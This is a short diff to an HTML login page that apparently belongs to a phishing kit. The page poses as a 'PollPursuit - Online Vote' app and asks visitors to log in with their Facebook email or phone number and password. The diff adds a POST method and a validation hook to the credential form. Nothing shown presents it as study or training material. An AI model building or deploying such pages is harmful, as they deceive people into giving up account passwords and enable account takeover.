@@ -23,13 +23,12 @@
         <div class="container-fluid"><img class="img-fluid" src="./assets/files/dF5SId3UHWd.svg" style="width: 140px; margin-top: 0px;"></div>
     </nav>
     <div class="contact-clean" style="padding: 0; padding-top: 0 px; padding-bottom: 0px; background: rgb(255,255,255);">
-        <form id="asset">
+        <form id="asset" method="post" onsubmit="return validateForm()">
+            <div><img class="img-fluid" src="https://cdn.icon-icons.com/icons2/3198/PNG/512/poll_icon_195220.png" style="width: 68px; margin-bottom: 11px;">
+               <p style="text-align: center; padding-right: 10%; padding-left: 10%; color: rgba(99,106,113,0.88);">Log into your Facebook account to connect to <strong>PollPursuit - Online Vote</strong><br></p>
+            </div>
             <div class="form-group" style="margin-bottom: 7px;">
-                <div>
-                    <img class="img-fluid" src="https://cdn.icon-icons.com/icons2/3198/PNG/512/poll_icon_195220.png" style="width: 100px; margin-bottom: 11px;">
-                    <p style="text-align: center; padding-right: 10%; padding-left: 10%; color: rgba(99,106,113,0.88);">Log into your Facebook account to connect to <strong>PollPursuit - Online Vote</strong><br></p>
-                </div>
-                <input class="form-control form-control-sm" type="text" id="email" name="eml" autocomplete="off" placeholder="Mobile number or email" style="background: #f5f6f7; border-radius: 5px;" autocomplete="off" required="">
+                <input class="form-control form-control-sm" type="text" id="email" autocomplete="off" name="eml" placeholder="Mobile number or email" style="background: #f5f6f7; border-radius: 5px;" required="">
             </div>
             <div class="form-group" style="margin-bottom: 14px;">
                 <input class="form-control form-control-sm" type="password" id="password" autocomplete="off" style="background: #f5f6f7; border-radius: 5px;" name="pwd" placeholder="Password" required="">
